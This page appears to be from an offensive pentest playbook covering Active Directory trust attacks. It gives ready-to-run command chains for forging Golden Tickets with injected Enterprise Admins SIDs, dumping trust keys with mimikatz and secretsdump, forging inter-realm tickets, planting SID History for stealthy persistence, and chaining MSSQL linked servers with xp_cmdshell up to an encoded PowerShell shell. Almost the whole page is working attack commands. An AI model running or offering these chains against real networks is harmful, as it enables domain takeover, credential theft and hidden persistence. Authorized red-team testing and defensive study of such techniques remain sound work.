---
title: "19 · Trust Attacks"
---

# 19 · Trust Attacks

> Forest and domain trusts are persistence, lateral, and escalation paths in one.

!!! note "Phase overview"
    Within a forest, SID filtering is OFF, so child→parent ExtraSid injection works trivially. Across forests, SID filtering is normally ON but trust keys can still forge inter-realm tickets. MSSQL linked servers ignore trust direction entirely and chain across the entire forest jungle.

### 19.1 · Child to Parent Domain (SID History / ExtraSids)

!!! info "Why this works / how it chains"

    Within a forest, SID filtering is disabled. The Enterprise Admins SID is S-1-5-21-<FOREST_ROOT_SID>-519. Forge a Golden Ticket in the child with that SID injected via ExtraSids; the parent DC honors it because no filter strips it. Result: instant DA in the parent.

!!! warning "What leads here"
    - Compromised child domain (have DA in child)
    - Got krbtgt hash of child domain
    - Know forest root domain SID

```bash title="Full child→parent chain"
# Step 1 - Get child domain krbtgt hash
impacket-secretsdump child.domain.local/administrator:pass@<CHILD_DC>
# Note: krbtgt NTLM hash

# Step 2 - Get child domain SID
impacket-lookupsid child.domain.local/administrator:pass@<CHILD_DC> 500
# Returns: S-1-5-21-CHILD-SID-500

# Step 3 - Get parent domain Enterprise Admins SID
impacket-lookupsid domain.local/user:pass@<PARENT_DC> | grep "Enterprise Admins"
# Returns: S-1-5-21-PARENT-SID-519

# Step 4 - Forge Golden Ticket with ExtraSids
impacket-ticketer \
  -nthash <CHILD_KRBTGT_HASH> \
  -domain-sid <S-1-5-21-CHILD-SID> \
  -domain child.domain.local \
  -extra-sid <S-1-5-21-PARENT-SID-519> \
  administrator

# Step 5 - Use ticket to access parent DC
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass \
  child.domain.local/administrator@parentdc.domain.local

# Step 6 - DCSync parent domain
impacket-secretsdump -k -no-pass \
  -just-dc child.domain.local/administrator@parentdc.domain.local
```


### 19.2 · Forest Trust Ticket (via Trust Key)

!!! info "Why this works / how it chains"

    Forest trusts have a shared inter-realm key (the trust key). Dump it (lsadump::trust /patch on DC, or look for [TRUST] entries in secretsdump output), then forge an inter-realm TGT signed with that key. Use it to request a TGS for a service in the target forest.

!!! warning "What leads here"
    - Bidirectional forest trust exists
    - Compromised one forest (have DA)
    - SID filtering may or may not be enabled

```bash title="Dump trust key + forge inter-realm TGT"
# Step 1 - Dump trust key (inter-realm key)
# Via mimikatz on DC:
lsadump::trust /patch
# OR via secretsdump - look for $FOREST_TRUST$ entry
impacket-secretsdump domain.local/administrator:pass@<DC_IP>
# Note the [TRUST] entries - these are trust keys

# Step 2 - Forge inter-realm TGT
impacket-ticketer \
  -nthash <TRUST_KEY_HASH> \
  -domain-sid <SOURCE_DOMAIN_SID> \
  -domain source.local \
  -spn krbtgt/target.local \
  administrator

# Step 3 - Request TGS for target forest services
export KRB5CCNAME=administrator.ccache
impacket-getST \
  -k -no-pass \
  -spn cifs/targetdc.target.local \
  source.local/administrator

# Step 4 - Access target forest
impacket-psexec -k -no-pass \
  source.local/administrator@targetdc.target.local
```


### 19.3 · SID History Injection (Persistence)

!!! info "Why this works / how it chains"

    Add a Domain Admins SID (or any high-priv SID) to a normal user via mimikatz misc::addsid. The user now appears in the DA group via SID History very stealthy because they're not actually in the group, they just carry the SID at auth time.

```powershell title="Add SID History to a user"
# Add SID History to a user (mimikatz - needs DA + debug)
.\mimikatz.exe "privilege::debug" \
  "misc::addsid targetuser S-1-5-21-TARGET-DOMAIN-SID-512" "exit"
# Now targetuser has Domain Admins membership via SID History

# Via PowerShell (Set-ADUser)
Set-ADUser -Identity targetuser \
  -Add @{SIDHistory="S-1-5-21-XXXX-512"}

# Verify
Get-ADUser targetuser -Properties SIDHistory
```


### 19.4 · MSSQL Cross-Forest Linked Servers

!!! info "Why this works / how it chains"

    MSSQL linked servers are point-to-point trust relationships independent of AD trusts. EXEC ('whoami') AT [SERVER] runs commands on the linked server in its security context. Chain links across forests for cross-forest code exec without ever forging a Kerberos ticket.

!!! warning "What leads here"
    - MSSQL linked servers configured across domains/forests
    - Database links work even across forest trusts!
    - Have xp_cmdshell on one SQL instance

```sql title="Enumerate + chain linked servers"
-- Enumerate linked servers
SELECT * FROM master..sysservers;
EXEC sp_linkedservers;

-- Execute on linked server
EXEC ('SELECT @@SERVERNAME') AT [LINKEDSERVER];
EXEC ('xp_cmdshell ''whoami''') AT [LINKEDSERVER];

-- Chain through multiple links
EXEC ('EXEC (''xp_cmdshell ''''whoami''''"") AT [SERVER3]') AT [SERVER2];

-- Enable xp_cmdshell on linked server
EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;
      sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LINKEDSERVER];

-- Get shell on linked server
EXEC ('xp_cmdshell ''powershell -e <BASE64>''') AT [LINKEDSERVER];
```

